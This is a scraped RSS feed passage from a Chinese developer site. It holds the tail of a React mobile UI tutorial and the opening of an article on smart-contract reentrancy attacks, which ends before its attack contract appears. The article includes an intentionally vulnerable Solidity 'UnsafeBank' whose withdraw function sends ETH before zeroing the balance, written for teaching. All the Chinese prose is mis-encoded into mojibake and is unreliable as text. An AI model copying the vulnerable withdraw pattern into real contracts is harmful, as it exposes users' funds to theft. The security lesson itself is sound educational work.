<span class="hljs-comment">// å¼•å…¥ shadcn çš„ Card ç»„ä»¶ç³»åˆ—</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Card</span>, <span class="hljs-title class_">CardHeader</span>, <span class="hljs-title class_">CardTitle</span>, <span class="hljs-title class_">CardContent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/card'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"é¦–é¡µ"</span> <span class="hljs-attr">showBackBtn</span>=<span class="hljs-string">{true}</span> /&gt;</span>
          
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"p-4 space-y-4"</span>&gt;</span> {/* space-y-4 ç»™æ‰€æœ‰å­å…ƒç´ ä¹‹é—´æ·»åŠ å‚ç›´é—´è· */}
            
            {/* è¿™é‡Œçš„ Card ç›´æ¥ä½¿ç”¨äº†æˆ‘ä»¬é¡¹ç›®é‡Œçš„ç»„ä»¶ä»£ç  */}
            <span class="hljs-tag">&lt;<span class="hljs-name">Card</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">CardHeader</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">CardTitle</span>&gt;</span>æ¬¢è¿æ¥åˆ° React Mobile<span class="hljs-tag">&lt;/<span class="hljs-name">CardTitle</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">CardHeader</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">CardContent</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-muted-foreground"</span>&gt;</span>è¿™æ˜¯åŸºäº shadcn/ui æ„å»ºçš„ç°ä»£åŒ–åº”ç”¨<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">CardContent</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Card</span>&gt;</span>

            {/* Grid å¸ƒå±€å±•ç¤ºåˆ—è¡¨ */}
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"grid grid-cols-2 gap-4"</span>&gt;</span>
            {
              [1,2,3,4,5,6,7,8,9,10,11,12].map((i,index) =&gt; (
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
                  <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span> 
                  <span class="hljs-attr">className</span>=<span class="hljs-string">"h-32 bg-white rounded-lg shadow-sm flex items-center justify-center border hover:shadow-md transition-shadow"</span>
                &gt;</span>
                  Item {i}
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
              ))
            }
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/&gt;</span></span>
    )
}
</code></pre>
<h3 data-id="heading-19">6.3 å›åˆ°é¡¶éƒ¨ (BackToTop)</h3>
<p>æœ€åï¼Œç»™ç”¨æˆ·ä¸€ä¸ªå°æƒŠå–œã€‚å½“é¡µé¢æ»‘åŠ¨è¶…è¿‡ä¸€å®šè·ç¦»æ—¶ï¼Œæ˜¾ç¤ºâ€œå›åˆ°é¡¶éƒ¨â€æŒ‰é’®ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/button'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ArrowUp</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'lucide-react'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">BackToTopProps</span> {
    threshould?: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// é˜ˆå€¼ï¼šæ»šåŠ¨å¤šå°‘åƒç´ æ˜¾ç¤º</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">BackToTop</span>:<span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">BackToTopProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{ threshould = <span class="hljs-number">400</span> }</span>) =&gt;</span>{
  <span class="hljs-keyword">const</span> [isVisible, setIsVisible] = useState&lt;<span class="hljs-built_in">boolean</span>&gt;(<span class="hljs-literal">false</span>);

  useEffect (<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleVisibility</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-comment">// window.scrollY è·å–å½“å‰å‚ç›´æ»šåŠ¨è·ç¦»</span>
        <span class="hljs-title function_">setIsVisible</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> &gt; threshould);
    }
    <span class="hljs-comment">// æ·»åŠ æ»šåŠ¨ç›‘å¬</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, toggleVisibility);
    
    <span class="hljs-comment">// ğŸ§¹ æ¸…ç†å‡½æ•°ï¼šç»„ä»¶å¸è½½æ—¶ç§»é™¤ç›‘å¬ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ï¼</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, toggleVisibility);
  }, [threshould])

  <span class="hljs-keyword">if</span>(!isVisible) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">scrollToTop</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span> }); <span class="hljs-comment">// å¹³æ»‘æ»šåŠ¨</span>
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
      <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span>
      <span class="hljs-attr">size</span>=<span class="hljs-string">"icon"</span>
      <span class="hljs-attr">onClick</span>=<span class="hljs-string">{scrollToTop}</span>
      <span class="hljs-attr">className</span>=<span class="hljs-string">"fixed bottom-20 right-6 rounded-full shadow-lg z-50 bg-white/80 backdrop-blur-sm"</span>
    &gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ArrowUp</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-4 h-4"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
  )
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">BackToTop</span>;
</code></pre>
<hr/>
<h2 data-id="heading-20">ğŸ“ æ€»ç»“ä¸é¢„å‘Š</h2>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å¹²äº†ä¸€ä»¶å¤§äº‹ï¼</p>
<ol>
<li><strong>å·¥ç¨‹åŒ–</strong>ï¼šé…ç½®äº† <code>@</code> è·¯å¾„åˆ«åï¼Œè®©é¡¹ç›®ç»“æ„æ›´æ¸…æ™°ã€‚</li>
<li><strong>UI é©å‘½</strong>ï¼šå¼•å…¥äº† <strong>shadcn/ui</strong>ï¼Œä½“éªŒäº†â€œæ‹¥æœ‰ç»„ä»¶ä»£ç â€çš„å¿«æ„Ÿã€‚</li>
<li><strong>æ¶æ„å®æˆ˜</strong>ï¼šæ­å»ºäº†å®Œæ•´çš„ç§»åŠ¨ç«¯è·¯ç”±æ¶æ„ï¼Œå®ç°äº† <code>MainLayout</code> + <code>BottomNav</code> çš„ç»å…¸å¸ƒå±€ã€‚</li>
<li><strong>æƒé™æ§åˆ¶</strong>ï¼šåˆ©ç”¨ Zustand + Router Guard å®ç°äº†å…¨å±€ç™»å½•æ‹¦æˆªã€‚</li>
<li><strong>Hooks è¿ç”¨</strong>ï¼šæ·±å…¥ä½¿ç”¨äº† <code>useEffect</code>, <code>useState</code>, <code>useLocation</code> ç­‰ React æ ¸å¿ƒæŠ€èƒ½ã€‚</li>
</ol>
<p>ç°åœ¨çš„åº”ç”¨è™½ç„¶é•¿å¾—æŒºå¥½çœ‹ï¼Œä½†æ•°æ®éƒ½æ˜¯å‡çš„ï¼ˆMock dataï¼‰ã€‚
<strong>ä¸‹ä¸€ç« é¢„å‘Š</strong>ï¼šæˆ‘ä»¬å°†å›åˆ°åç«¯ï¼Œå®Œå–„ NestJS æ¥å£ï¼Œæ‰“é€šå‰åç«¯ä»»ç£äºŒè„‰ï¼Œå®ç°çœŸæ­£çš„<strong>ç”¨æˆ·ç™»å½•</strong>å’Œ<strong>æ–‡ç« åˆ—è¡¨è·å–</strong>ï¼</p>
<p>æˆ‘ä»¬è¦æŠŠâ€œå…¨æ ˆâ€è¿›è¡Œåˆ°åº•ï¼å¤§å®¶åŠ æ²¹ï¼ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é»‘åƒé»‘ï¼šé‡å…¥æ”»å‡»ç§’æETHï¼‹ç¬é”ä¿®å¤]]></title>    <link>https://juejin.cn/post/7596869784538988544</link>    <guid>https://juejin.cn/post/7596869784538988544</guid>    <pubDate>2026-01-19T17:11:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596869784538988544" data-draft-id="7596845113281708041" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é»‘åƒé»‘ï¼šé‡å…¥æ”»å‡»ç§’æETHï¼‹ç¬é”ä¿®å¤"/> <meta itemprop="keywords" content="æ™ºèƒ½åˆçº¦,Solidity,web3"/> <meta itemprop="datePublished" content="2026-01-19T17:11:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ¨è¥¿"/> <meta itemprop="url" content="https://juejin.cn/user/2436173496845549"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é»‘åƒé»‘ï¼šé‡å…¥æ”»å‡»ç§’æETHï¼‹ç¬é”ä¿®å¤
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173496845549/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ¨è¥¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:11:10.000Z" title="Mon Jan 19 2026 17:11:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<blockquote>
<p>æœ¬æ–‡èšç„¦ DeFi é¢†åŸŸä¸­å…¸å‹çš„é‡å…¥æ”»å‡»ï¼ˆReentrancy Attackï¼‰å®‰å…¨æ¼æ´ï¼Œä»ç†è®ºå±‚é¢å‰–æé‡å…¥æ”»å‡»çš„åŸç†ä¸å±å®³ï¼Œå†åŸºäº Hardhat V3 å¼€å‘æ¡†æ¶ï¼Œç»“åˆ OpenZeppelin V5 å®‰å…¨åº“ï¼Œé€šè¿‡ä»£ç å®è·µå®Œæ•´å¤ç°é‡å…¥æ”»å‡»çš„å…¨è¿‡ç¨‹ï¼›æœ€åé’ˆå¯¹è¯¥æ¼æ´çš„æ ¸å¿ƒæˆå› ï¼Œç»™å‡ºåŸºäºè¡Œä¸šæœ€ä½³å®è·µçš„ä¿®å¤æ–¹æ¡ˆï¼Œå¹¶é€šè¿‡ä»£ç éªŒè¯ä¿®å¤æ•ˆæœã€‚å…¨æ–‡é‡‡ç”¨ â€œç†è®ºåˆ†æ - æ”»å‡»å¤ç° - æ¼æ´ä¿®å¤â€ çš„é€»è¾‘è„‰ç»œï¼Œå°†é‡å…¥æ”»å‡»çš„æŠ€æœ¯åŸç†ä¸å·¥ç¨‹å®è·µç›¸ç»“åˆï¼Œæ¸…æ™°å‘ˆç°è¯¥å®‰å…¨æ¼æ´çš„é£é™©ç‚¹åŠé˜²æŠ¤æ‰‹æ®µã€‚</p>
</blockquote>
<h2 data-id="heading-1">é‡å…¥æ”»å‡»æ˜¯ä»€ä¹ˆ</h2>
<p><strong>1. æ ¸å¿ƒå®šä¹‰</strong>ï¼šé‡å…¥æ”»å‡»ï¼ˆReentrancy Attackï¼‰æ˜¯æ™ºèƒ½åˆçº¦ä¸­ä¸€ç§ç»å…¸çš„å®‰å…¨æ¼æ´ã€‚å®ƒçš„æ ¸å¿ƒåŸç†æ˜¯ï¼š<strong>å¤–éƒ¨æ¶æ„åˆçº¦åˆ©ç”¨å›è°ƒæœºåˆ¶ï¼Œåœ¨ç›®æ ‡åˆçº¦çš„å‡½æ•°æ‰§è¡Œè¿‡ç¨‹å°šæœªç»“æŸï¼ˆå³çŠ¶æ€å˜é‡å°šæœªæ›´æ–°ï¼‰æ—¶ï¼Œå†æ¬¡é€’å½’è°ƒç”¨è¯¥å‡½æ•°ï¼Œä»è€Œåå¤çªƒå–èµ„äº§æˆ–ç ´åé€»è¾‘ã€‚</strong></p>
<p><strong>2. é€šä¿—ç±»æ¯”</strong></p>
<ul>
<li><strong>åœºæ™¯</strong>ï¼šä½ å»é“¶è¡Œå–é’±ã€‚</li>
<li><strong>æ­£å¸¸æµç¨‹</strong>ï¼šä½ ç”³è¯·å–é’± -&gt; é“¶è¡Œæ‰£é™¤ä½ çš„ä½™é¢ -&gt; é“¶è¡Œç»™ä½ ç°é‡‘ã€‚</li>
<li><strong>é‡å…¥æ”»å‡»æµç¨‹</strong>ï¼šä½ ç”³è¯·å–é’± -&gt; é“¶è¡Œç»™ä½ ç°é‡‘ï¼ˆè¿˜æ²¡æ¥å¾—åŠæ‰£ä½™é¢ï¼‰ -&gt; ä½ æ‹¿åˆ°ç°é‡‘çš„ç¬é—´ï¼Œç«‹åˆ»åˆç”³è¯·å–é’± -&gt; é“¶è¡Œæ£€æŸ¥ä½™é¢ï¼ˆè¿˜æ˜¯æ»¡çš„ï¼‰ -&gt; é“¶è¡Œåˆç»™ä½ ç°é‡‘â€¦â€¦ å¾ªç¯å¾€å¤ï¼Œç›´åˆ°é“¶è¡Œç ´äº§ã€‚</li>
</ul>
<p><strong>3. æŠ€æœ¯åŸç†</strong>ï¼šåœ¨ Ethereumï¼ˆä»¥å¤ªåŠï¼‰ç­‰ EVM å…¼å®¹é“¾ä¸Šï¼Œå½“åˆçº¦å‘å¤–éƒ¨åœ°å€ï¼ˆEOA æˆ–å…¶ä»–åˆçº¦ï¼‰å‘é€ ETHï¼ˆä½¿ç”¨<code>call</code>ï¼‰æˆ–æ‰§è¡Œä½çº§åˆ«è°ƒç”¨æ—¶ï¼Œæ¥æ”¶æ–¹åˆçº¦çš„<code>fallback()</code>æˆ–<code>receive()</code>å‡½æ•°ä¼šè¢«è§¦å‘ã€‚å¦‚æœç›®æ ‡åˆçº¦åœ¨<strong>ä¿®æ”¹çŠ¶æ€å˜é‡ï¼ˆå¦‚ç”¨æˆ·ä½™é¢ï¼‰ä¹‹å‰</strong>å°±æ‰§è¡Œäº†è½¬è´¦æ“ä½œï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨<code>fallback</code>å‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ç›®æ ‡åˆçº¦çš„ææ¬¾å‡½æ•°ï¼Œå¯¼è‡´ â€œä½™é¢æœªæ¸…é›¶â€ çš„æ¼æ´è¢«åå¤åˆ©ç”¨ã€‚</p>
<h2 data-id="heading-2">Web3 å†å²ä¸Šçš„é‡å¤§é‡å…¥æ”»å‡»äº‹ä»¶</h2>









































<table><thead><tr><th>äº‹ä»¶åç§°</th><th>å‘ç”Ÿæ—¶é—´</th><th>æŸå¤±é‡‘é¢</th><th>æ ¸å¿ƒç»†èŠ‚</th></tr></thead><tbody><tr><td>The DAO æ”»å‡»</td><td>2016 å¹´</td><td>çº¦ 6000 ä¸‡ç¾å…ƒï¼ˆå½“æ—¶çº¦å ä»¥å¤ªåŠæ€»é‡çš„ 15%ï¼‰</td><td>åˆ©ç”¨ DAO åˆçº¦ä¸­<code>splitDAO</code>å‡½æ•°çš„é‡å…¥æ¼æ´ï¼Œé€šè¿‡é€’å½’è°ƒç”¨å°†èµ„é‡‘è½¬ç§»åˆ°å­ DAO ä¸­ï¼Œå¯¼è‡´ä»¥å¤ªåŠç¤¾åŒºç¡¬åˆ†å‰ä¸º ETH å’Œ ETCã€‚</td></tr><tr><td>Parity é’±åŒ…å¤šé‡ç­¾åæ¼æ´æ”»å‡»</td><td>2017 å¹´</td><td>çº¦ 3000 ä¸‡ç¾å…ƒ</td><td>ä¸»å› ä¸ºåº“åˆçº¦è‡ªæ€è‡´ä»£ç ä¸å¯ç”¨ï¼Œ<code>delegatecall</code>é‡å…¥é€»è¾‘å¤æ‚æ€§æ˜¯å¯¼ç«ç´¢ä¹‹ä¸€ï¼Œé€ æˆå¤šä¸ªé’±åŒ…åˆçº¦è¢«å†»ç»“æˆ–ç›—å–ã€‚</td></tr><tr><td>bZx é—ªç”µè´·é‡å…¥æ”»å‡»</td><td>2020 å¹´</td><td>çº¦ 800 ä¸‡ç¾å…ƒ</td><td>DeFi Summer åˆæœŸå…¸å‹æ”»å‡»ï¼Œç»“åˆé—ªç”µè´·ä¸é‡å…¥æ”»å‡»ï¼Œæ“çºµä»·æ ¼åå€Ÿé‡å…¥æ¼æ´åœ¨æ—§ä»·æ ¼ä¸‹æ¸…ç®—å¥—åˆ©ï¼Œå¼€å¯ç»„åˆæ‹³æ”»å‡»æ—¶ä»£ã€‚</td></tr><tr><td>Cream Finance æ”»å‡»</td><td>2021 å¹´</td><td>çº¦ 1.3 äº¿ç¾å…ƒ</td><td>åˆ©ç”¨ ETH å’Œ YFI å¸‚åœºé‡å…¥æ¼æ´ï¼Œé“¸é€ å¤§é‡ crETH ä»£å¸å¹¶èµå›ï¼Œå¯¼è‡´åè®®å·¨é¢æŸå¤±ã€‚</td></tr><tr><td>Euler Finance æ”»å‡»</td><td>2023 å¹´</td><td>çº¦ 1.97 äº¿ç¾å…ƒ</td><td>åˆ©ç”¨ DToken åˆçº¦é‡å…¥æ¼æ´ï¼Œåœ¨æ¸…ç®—è¿‡ç¨‹ä¸­åå¤å€Ÿæ¬¾å¹¶æå–æŠµæŠ¼å“ï¼Œé€ æˆå·¨é¢æŸå¤±ã€‚</td></tr></tbody></table>
<h2 data-id="heading-3">é‡å…¥æ”»å‡»çš„å±å®³</h2>
<p><strong>1. èµ„äº§ç›´æ¥è¢«ç›—ï¼ˆç»æµæŸå¤±ï¼‰</strong>ï¼šè¿™æ˜¯æœ€ç›´æ¥çš„åæœã€‚æ”»å‡»è€…å¯ä»¥åœ¨åˆçº¦é€»è¾‘æœªèƒ½æ›´æ–°ä½™é¢ä¹‹å‰ï¼Œå°†åˆçº¦å†…çš„æ‰€æœ‰æµåŠ¨æ€§èµ„é‡‘ï¼ˆETHã€ERC20 ä»£å¸ç­‰ï¼‰è½¬ç§»è‡³è‡ªå·±çš„åœ°å€ï¼Œå¯¼è‡´åè®®ç¬é—´èµ„ä¸æŠµå€ºï¼ˆRug Pullï¼‰ã€‚</p>
<p><strong>2. åˆçº¦çŠ¶æ€æ··ä¹±ï¼ˆé€»è¾‘ç ´åï¼‰</strong>ï¼šå³ä½¿èµ„é‡‘æ²¡æœ‰è¢«è½¬èµ°ï¼Œåå¤çš„é€’å½’è°ƒç”¨å¯èƒ½å¯¼è‡´åˆçº¦çš„çŠ¶æ€å˜é‡ï¼ˆå¦‚å€Ÿè´·åˆ©ç‡ã€æ¸…ç®—ä»·æ ¼ã€æ€»ä¾›åº”é‡ï¼‰è®¡ç®—é”™è¯¯ã€‚ä¸€æ—¦çŠ¶æ€è¢«ç ´åï¼Œåˆçº¦å¯èƒ½æ°¸ä¹…æ— æ³•æ­£å¸¸è¿è¡Œï¼Œç”šè‡³å¯¼è‡´å‰©ä½™èµ„äº§æ— æ³•æå–ã€‚</p>
<p><strong>3. åè®®ä¿¡ä»»å´©å¡Œï¼ˆå£°èª‰ç ´äº§ï¼‰</strong>ï¼šDeFi çš„æ ¸å¿ƒæ˜¯ â€œCode is Lawâ€ï¼ˆä»£ç å³æ³•å¾‹ï¼‰ã€‚ä¸€æ—¦å‘ç”Ÿé‡å…¥æ”»å‡»ï¼Œæ„å‘³ç€ä»£ç å­˜åœ¨è‡´å‘½ç¼ºé™·ï¼Œç”¨æˆ·ä¼šå¯¹åè®®å¤±å»ä¿¡ä»»ï¼Œå¯¼è‡´æµåŠ¨æ€§è¿…é€Ÿæ’¤ç¦»ï¼Œé¡¹ç›®æ–¹ä»£å¸ä»·æ ¼å½’é›¶ï¼Œé¡¹ç›®ç›´æ¥æ­»äº¡ã€‚</p>
<p><strong>4. å¤æ‚æ”»å‡»çš„è·³æ¿</strong>ï¼šåœ¨ç°ä»£ DeFi æ”»å‡»ä¸­ï¼Œé‡å…¥å¾€å¾€ä¸æ˜¯å•ä¸€æ‰‹æ®µï¼Œè€Œæ˜¯é…åˆé—ªç”µè´·ã€ä»·æ ¼æ“çºµã€é¢„è¨€æœºæ”»å‡»çš„å…³é”®ä¸€ç¯ã€‚å®ƒèƒ½æ”¾å¤§æ”»å‡»çš„æ æ†æ•ˆåº”ï¼Œè®©æ”»å‡»è€…åœ¨ä¸€ä¸ªåŒºå—å†…å®Œæˆæ•°äº¿çº§åˆ«çš„å¥—åˆ©ã€‚</p>
<h2 data-id="heading-4">æ™ºèƒ½åˆçº¦å®ç°</h2>
<h3 data-id="heading-5">æ¼æ´å¤ç°</h3>
<h4 data-id="heading-6">æ™ºèƒ½åˆçº¦</h4>
<ul>
<li><strong>ä¸å®‰å…¨é“¶è¡Œåˆçº¦</strong></li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-selector-class">.24</span>;

contract UnsafeBank {
    <span class="hljs-built_in">mapping</span>(address =&gt; uint) public balances;

    function <span class="hljs-built_in">deposit</span>() external payable {
        balances<span class="hljs-selector-attr">[msg.sender]</span> += msg<span class="hljs-selector-class">.value</span>;
    }

    function <span class="hljs-built_in">withdraw</span>() external {
        uint amount = balances<span class="hljs-selector-attr">[msg.sender]</span>;
        <span class="hljs-built_in">require</span>(amount &gt; <span class="hljs-number">0</span>, "no fund");

        <span class="hljs-comment">// å…ˆè½¬è´¦ï¼Œåæ›´æ–° â†’ å¯è¢«é‡å…¥</span>
        (bool ok,) = msg<span class="hljs-selector-class">.sender</span><span class="hljs-selector-class">.call</span>{value: amount}("");
        <span class="hljs-built_in">require</span>(ok, "send failed");

        balances<span class="hljs-selector-attr">[msg.sender]</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// å¤ªæ™šï¼</span>
    }
}
</code></pre>
<ul>
<li><strong>é‡å…¥æ”»å‡»åˆçº¦</strong></li>
</ul>
